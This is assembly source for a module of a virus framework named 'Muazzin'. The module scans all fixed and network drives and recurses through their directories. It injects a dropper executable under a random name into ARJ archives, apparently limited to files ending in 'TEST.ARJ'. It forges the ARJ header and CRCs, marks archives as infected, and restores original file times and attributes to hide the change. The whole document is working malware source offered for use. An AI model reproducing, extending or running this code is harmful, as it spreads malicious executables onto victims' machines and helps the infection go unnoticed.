;Muazzin - drop random EXE file to ARJ, recurse dirs, search all drives

BITS 32

%include "\muazzin\muazzin.asi"
%include "arj.inc"

TYPE    EQU "iarj"
VERSION EQU 0001h

entry:
       mov esi, [esp+4]                 ;esi==muazzin_struc
       test dword [esi+m_why], MT_APP
       jz .query
       call delta
       mov eax, [esi+GPA]
       mov [ebp+getpaddr], eax
       mov eax, [esi+GMH]
       mov [ebp+getmhnd], eax
       mov eax, [esi+m_droppersize]
       mov [ebp+size], eax
       mov eax, [esi+m_dropper]
       mov [ebp+dropper], eax
       pushad
       call get_apis
       call scandisk
       popad
  .exit:
       mov dword [esi+m_result], MR_DONE
       ret 4
  .query:
       test dword [esi+m_why], MT_QUERY
       jz .exit
       mov esi, MT_QUERY+MT_APP
       mov ebx, TYPE
       mov ecx, VERSION
       mov eax, MR_DONE
       ret 4

delta:
       call .delta
  .delta:
       pop ebp
       sub ebp, .delta
       ret

get_apis:
       lea eax, [ebp+skernel32]
       push eax
       call [ebp+getmhnd]
       mov [ebp+kernel32], eax
       lea esi, [ebp+_apis]
       mov edi, esi
  .loop:
       lodsd
       test eax, eax
       jz .done
       add eax, ebp
       push eax
       push dword [ebp+kernel32]
       call [ebp+getpaddr]
       stosd
       jmp .loop
  .done:
       ret

scandisk:
       sub esi, esi
       call delta
       lea edi, [ebp+_root]
       cmp byte [edi], "Z"
       je .done
       inc byte [edi]
       push edi
       call [ebp+GetDriveType]
       cmp eax, 3
       je .ok
       cmp eax, 4
       jne scandisk
  .ok:
       push edi
       call [ebp+SetCurrentDirectoryA]
       test eax, eax
       jz scandisk
       call .recurse
       jmp scandisk
  .done:
       ret
  .recurse:
       lea eax, [ebp+esi+_wfd]
       push eax
       lea eax, [ebp+_mask]
       push eax
       call [ebp+FindFirstFileA]
       mov [ebp+esi+_hnd], eax
       inc eax
       jz .updir
  .continue:
       test dword [ebp+esi+WFD_dwFileAttributes], 10h
       jnz .checkdir
       lea edi, [ebp+esi+WFD_szFileName]
       call checkname
  .nextf:
       lea eax, [ebp+esi+_wfd]
       push eax
       push dword [ebp+esi+_hnd]
       call [ebp+FindNextFileA]
       test eax, eax
       jnz .continue
  .updir:
       push dword [ebp+esi+_hnd]
       call [ebp+FindClose]
       lea eax, [ebp+_low]
       push eax
       call [ebp+SetCurrentDirectoryA]
       sub esi, DSIZE
       ret
  .checkdir:
       lea eax, [ebp+esi+WFD_szFileName]
       cmp byte [eax], '.'
       je .nextf
       push eax
       call [ebp+SetCurrentDirectoryA]
       test eax, eax
       jz .nextf
       add esi, DSIZE
       call .recurse
       jmp .nextf

checkname:
       pushad
       mov edx, edi
       sub eax, eax
       mov ecx, dword 260
       repne scasb
       cmp dword [edi-5], '.ARJ'
       jne near .noarj
       cmp dword [edi-9], 'TEST'
       jne near .noarj

       push edx
       call [ebp+GetFileAttributesA]
       inc eax
       jz near .noarj
       dec eax
       push eax
       push edx                 ;paramz to setattrib

       push byte 0
       push dword 80h
       push byte 3           ;create existing
       push byte 0
       push byte 0
       push dword 0c0000000h
       push edx
       call [ebp+CreateFileA]
       mov ebx, eax
       inc eax
       jz near .end_attr
       push ebx

       lea eax, [ebp+h1]
       push eax
       lea eax, [ebp+h2]
       push eax
       lea eax, [ebp+h3]
       push eax
       push ebx
       call [ebp+GetFileTime]

       push byte 2
       push byte 0
       push byte -8
       push ebx
       call [ebp+SetFilePointer]        ;seek end -8

       push dword 0
       mov eax, esp
       push dword 0
       push eax
       push byte 8
       lea edi, [ebp+buffer]
       push edi
       push ebx
       call [ebp+ReadFile]
       pop ecx                          ;edi/ecx:DATA

       cmp dword [edi+ecx-4], 0ea60h
       jne near .end_close

       add ecx, -9
       cmp [edi], ecx              ;last dword = -1 ->already infected
       mov [edi], ecx
       je near .end_close

       push byte 2
       push byte 0
       push byte -4
       push ebx
       call [ebp+SetFilePointer]        ;seek end -4

       mov ecx, [ebp+size]
       mov esi, [ebp+dropper]

       call random
       mov edx, eax

       push dword [esi+ecx-4]     ;push last dword of dropper

       pushad
       mov dword [esi+ecx-4], -1

       lea edi, [ebp+arj_s]

       mov [edi+arjheader.arj_compressedsize], ecx
       mov [edi+arjheader.arj_uncompressedsize], ecx

       push byte 0
       push ecx
       push esi
       call crc32
       mov [edi+arjheader.arj_filecrc], eax

       lea esi, [edi+arjheader.arj_filename]
       xchg edi, esi                            ;esi=arj header
       mov ecx, 8
       call random
       mov edx, eax
  .name:
       mov byte [edi], "A"
       mov al, dl
       and al, 01111b
       add [edi], al
       inc edi
       ror edx, 13
       loop .name

       add edi, 6
       push edi

       push esi
       add esi, 4

       push byte 0
       sub edi, esi
       push edi
       push esi
       call crc32
       pop esi
       pop edi
       stosd            ;header crc32

       push eax
       mov eax, esp
       push byte 0
       push eax
       push dword (arj_e-arj_s)
       push esi   ;esi=header
       push ebx
       call [ebp+WriteFile]             ;write header
       pop eax

       popad
       pop dword [esi+ecx-4]     ;push last dword of dropper

       push eax
       mov eax, esp
       push byte 0
       push eax
       sub ecx, 4
       push ecx
       push esi
       push ebx
       call [ebp+WriteFile]
       pop eax

       push eax
       mov eax, esp
       push byte 0
       push eax
       push byte 8
       lea eax, [ebp+buffer]
       push eax
       push ebx
       call [ebp+WriteFile]
       pop eax

  .end_close:
       push dword [ebp+h1]
       push dword [ebp+h2]
       push dword [ebp+h3]
       push ebx
       call [ebp+SetFileTime]
       call [ebp+CloseHandle]
  .end_attr:
       call [ebp+SetFileAttributesA]
  .noarj:
       popad
       ret

random:
       push ecx
       push edx
       call [ebp+GetTickCount]
       sub edx, edx
       mov ecx, 8
  .shuffle:
       add eax, eax
       jnc .skip
       mul ecx
       xor eax, edx
  .skip:
       ror eax, cl
       loop .shuffle
       pop edx
       pop ecx
       ret

%include "crc32.asi"

_root  db '@:\',   0
_mask  db '*.*', 0
_low   db '..',  0

kernel32 dd 0
getpaddr dd 0
getmhnd  dd 0

h1       dd 0,0
h2       dd 0,0
h3       dd 0,0

skernel32 db 'KERNEL32', 0

size    dd 0
dropper dd 0

api000 db "GetDriveTypeA", 0
api001 db "SetCurrentDirectoryA", 0
api002 db "FindFirstFileA", 0
api003 db "FindNextFileA", 0
api004 db "FindClose", 0
api005 db "CreateFileA", 0
api006 db "ReadFile", 0
api007 db "WriteFile", 0
api008 db "CloseHandle", 0
api009 db "SetFilePointer", 0
api010 db "GetFileAttributesA", 0
api011 db "SetFileAttributesA", 0
api012 db "GetFileTime", 0
api013 db "SetFileTime", 0
api014 db "GetTickCount", 0

_apis:
GetDriveType         dd api000
SetCurrentDirectoryA dd api001
FindFirstFileA       dd api002
FindNextFileA        dd api003
FindClose            dd api004
CreateFileA          dd api005
ReadFile             dd api006
WriteFile            dd api007
CloseHandle          dd api008
SetFilePointer       dd api009
GetFileAttributesA   dd api010
SetFileAttributesA   dd api011
GetFileTime          dd api012
SetFileTime          dd api013
GetTickCount         dd api014

arj_s:
incbin "arj_hdr.bin"
arj_e:

buffer times 16 db -1

_wfd
WFD_dwFileAttributes    RESD 1
WFD_ftCreationTime      RESD 2
WFD_ftLastAccessTime    RESD 2
WFD_ftLastWriteTime     RESD 2
WFD_nFileSizeHigh       RESD 1
WFD_nFileSizeLow        RESD 1
WFD_dwReserved0         RESD 1
WFD_dwReserved1         RESD 1
WFD_szFileName          RESB 260
WFD_szAlternateFileName RESB 13
                        RESB 3
_hnd                    RESD 1
_wfd_e

DSIZE equ (_wfd_e-_wfd)

